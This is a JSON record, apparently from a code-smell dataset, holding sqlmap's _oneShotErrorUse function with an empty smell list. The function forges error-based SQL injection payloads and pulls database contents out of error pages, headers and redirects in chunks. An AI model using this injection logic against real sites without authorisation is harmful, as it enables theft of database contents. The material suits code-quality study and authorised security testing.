{
    "code": "def _oneShotErrorUse(expression, field=None, chunkTest=False):\n    offset = 1\n    partialValue = None\n    threadData = getCurrentThreadData()\n    retVal = hashDBRetrieve(expression, checkConf=True)\n\n    if retVal and PARTIAL_VALUE_MARKER in retVal:\n        partialValue = retVal = retVal.replace(PARTIAL_VALUE_MARKER, \"\")\n        logger.info(\"resuming partial value: '%s'\" % _formatPartialContent(partialValue))\n        offset += len(partialValue)\n\n    threadData.resumed = retVal is not None and not partialValue\n\n    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:\n        debugMsg = \"searching for error chunk length...\"\n        logger.debug(debugMsg)\n\n        current = MAX_ERROR_CHUNK_LENGTH\n        while current >= MIN_ERROR_CHUNK_LENGTH:\n            testChar = str(current % 10)\n            testQuery = \"SELECT %s('%s',%d)\" % (\"REPEAT\" if Backend.isDbms(DBMS.MYSQL) else \"REPLICATE\", testChar, current)\n            result = unArrayizeValue(_oneShotErrorUse(testQuery, chunkTest=True))\n            if result and testChar in result:\n                if result == testChar * current:\n                    kb.errorChunkLength = current\n                    break\n                else:\n                    current = len(result) - len(kb.chars.stop)\n            else:\n                current = current / 2\n\n        if kb.errorChunkLength:\n            hashDBWrite(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH, kb.errorChunkLength)\n        else:\n            kb.errorChunkLength = 0\n\n    if retVal is None or partialValue:\n        try:\n            while True:\n                check = \"%s(?P<result>.*?)%s\" % (kb.chars.start, kb.chars.stop)\n                trimcheck = \"%s(?P<result>[^<]*)\" % (kb.chars.start)\n\n                if field:\n                    nulledCastedField = agent.nullAndCastField(field)\n\n                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and not any(_ in field for _ in (\"COUNT\", \"CASE\")) and kb.errorChunkLength and not chunkTest:\n                        extendedField = re.search(r\"[^ ,]*%s[^ ,]*\" % re.escape(field), expression).group(0)\n                        if extendedField != field:  # e.g. MIN(surname)\n                            nulledCastedField = extendedField.replace(field, nulledCastedField)\n                            field = extendedField\n                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, kb.errorChunkLength)\n\n                # Forge the error-based SQL injection request\n                vector = kb.injection.data[kb.technique].vector\n                query = agent.prefixQuery(vector)\n                query = agent.suffixQuery(query)\n                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression\n                injExpression = unescaper.escape(injExpression)\n                injExpression = query.replace(\"[QUERY]\", injExpression)\n                payload = agent.payload(newValue=injExpression)\n\n                # Perform the request\n                page, headers = Request.queryPage(payload, content=True, raise404=False)\n\n                incrementCounter(kb.technique)\n\n                if page and conf.noEscape:\n                    page = re.sub(r\"('|\\%%27)%s('|\\%%27).*?('|\\%%27)%s('|\\%%27)\" % (kb.chars.start, kb.chars.stop), \"\", page)\n\n                # Parse the returned page to get the exact error-based\n                # SQL injection output\n                output = reduce(lambda x, y: x if x is not None else y, (\\\n                        extractRegexResult(check, page, re.DOTALL | re.IGNORECASE), \\\n                        extractRegexResult(check, listToStrValue([headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()] \\\n                        if headers else None), re.DOTALL | re.IGNORECASE), \\\n                        extractRegexResult(check, threadData.lastRedirectMsg[1] \\\n                        if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \\\n                        threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)), \\\n                        None)\n\n                if output is not None:\n                    output = getUnicode(output)\n                else:\n                    trimmed = extractRegexResult(trimcheck, page, re.DOTALL | re.IGNORECASE) \\\n                        or extractRegexResult(trimcheck, listToStrValue([headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()] \\\n                        if headers else None), re.DOTALL | re.IGNORECASE) \\\n                        or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] \\\n                        if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \\\n                        threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)\n\n                    if trimmed:\n                        if not chunkTest:\n                            warnMsg = \"possible server trimmed output detected \"\n                            warnMsg += \"(due to its length and/or content): \"\n                            warnMsg += safecharencode(trimmed)\n                            logger.warn(warnMsg)\n\n                        if not kb.testMode:\n                            check = \"(?P<result>.*?)%s\" % kb.chars.stop[:2]\n                            output = extractRegexResult(check, trimmed, re.IGNORECASE)\n\n                            if not output:\n                                check = \"(?P<result>[^\\s<>'\\\"]+)\"\n                                output = extractRegexResult(check, trimmed, re.IGNORECASE)\n                            else:\n                                output = output.rstrip()\n\n                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)):\n                    if offset == 1:\n                        retVal = output\n                    else:\n                        retVal += output if output else ''\n\n                    if output and kb.errorChunkLength and len(output) >= kb.errorChunkLength and not chunkTest:\n                        offset += kb.errorChunkLength\n                    else:\n                        break\n\n                    if kb.fileReadMode and output:\n                        dataToStdout(_formatPartialContent(output).replace(r\"\\n\", \"\\n\").replace(r\"\\t\", \"\\t\"))\n                else:\n                    retVal = output\n                    break\n        except:\n            if retVal is not None:\n                hashDBWrite(expression, \"%s%s\" % (retVal, PARTIAL_VALUE_MARKER))\n            raise\n\n        retVal = decodeHexValue(retVal) if conf.hexConvert else retVal\n\n        if isinstance(retVal, basestring):\n            retVal = htmlunescape(retVal).replace(\"<br>\", \"\\n\")\n\n        retVal = _errorReplaceChars(retVal)\n\n        if retVal is not None:\n            hashDBWrite(expression, retVal)\n\n    else:\n        _ = \"%s(?P<result>.*?)%s\" % (kb.chars.start, kb.chars.stop)\n        retVal = extractRegexResult(_, retVal, re.DOTALL | re.IGNORECASE) or retVal\n\n    return safecharencode(retVal) if kb.safeCharEncode else retVal",
    "smell": []
}